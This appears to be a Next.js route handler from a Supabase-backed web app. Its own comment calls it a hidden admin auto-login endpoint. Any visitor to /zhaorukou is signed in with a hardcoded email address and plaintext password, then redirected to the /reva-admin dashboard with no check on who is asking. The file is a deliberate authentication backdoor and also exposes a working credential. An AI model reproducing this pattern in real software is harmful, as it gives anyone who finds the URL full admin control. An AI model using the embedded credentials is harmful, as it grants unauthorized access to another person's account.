import { createClient } from '@/lib/supabase/server'
import { NextRequest, NextResponse } from 'next/server'

/**
 * Hidden admin auto-login endpoint.
 * Visiting /zhaorukou in the browser logs in directly and redirects to admin dashboard.
 */
export async function GET(_req: NextRequest) {
  const supabase = await createClient()

  const { error } = await supabase.auth.signInWithPassword({
    email: 'ohmyliinnn@gmail.com',
    password: 'zhaorukou4',
  })

  if (error) {
    return new NextResponse('Login gagal: ' + error.message, { status: 500 })
  }

  return NextResponse.redirect(new URL('/reva-admin', _req.url))
}
